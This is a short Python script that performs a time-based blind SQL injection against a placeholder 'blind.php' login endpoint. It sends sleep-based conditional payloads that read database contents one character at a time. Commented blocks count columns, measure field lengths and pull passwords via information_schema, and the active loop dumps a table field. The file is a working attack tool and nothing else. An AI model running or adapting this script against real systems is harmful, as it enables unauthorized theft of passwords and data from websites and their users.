from urllib import request

def doinject(payload,i,res):
    url = 'http://xxx.xxx.xxx/blind.php?username=admin\'+and+'+payload+'%23'

    #print data
    req = request.Request(url)
    print(req.get_full_url())
    # req.add_header('cookie','xx=xxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    try:
        with request.urlopen(req) as f:
            data=f.read()
    except ConnectionResetError:
        try:
            with request.urlopen(req) as f:
                data = f.read()
        except ConnectionResetError:
            print(chr(i))
            res.append(chr(i))
            return 1
    return 0

res=[]
# for z in range(0,3):
#     for j in range (1,9):
#         for i in range(97,123):
#             num=doinject('if(substr((select+password+from+information_schema.columns+where+table_name=0x6D6F74746F+limit+'+str(z)+',1),'+str(j)+',1)=CHAR('+str(i)+'),sleep(13),null)',i,res)
#             if(num):
#                 break
#
#         # num = doinject('\' union select if(substring(current,1,1)=char('+str(i)+'),sleep(6),null),2 from (select database() as current) as tbl%23')
#
#     print(res)

# get count(coulumns)
# i=102
# for z in range(48,58):
#     num=doinject('if(substr((select+count(*)+from+information_schema.columns+where+table_schema=0x6D79646273+and+table_name=0x6D6F74746F),1,1)=CHAR('+str(z)+'),sleep(13),null)',i,res)
#     if(num):
#         break

# get length
# i=102
# for z in range(48,58):
#     num=doinject('if(length((select+username+from+motto+limit+3,1))=CHAR('+str(z)+'),sleep(13),null)',i,res)
#     if(num):
#         break

# dump
for i in range(1,15):
    for z in range(97,123):
        num=doinject('if(substr((select+xxx+from+xxx+limit+3,1),'+str(i)+',1)=CHAR('+str(z)+'),sleep(13),null)',z,res)
        if(num):
            break

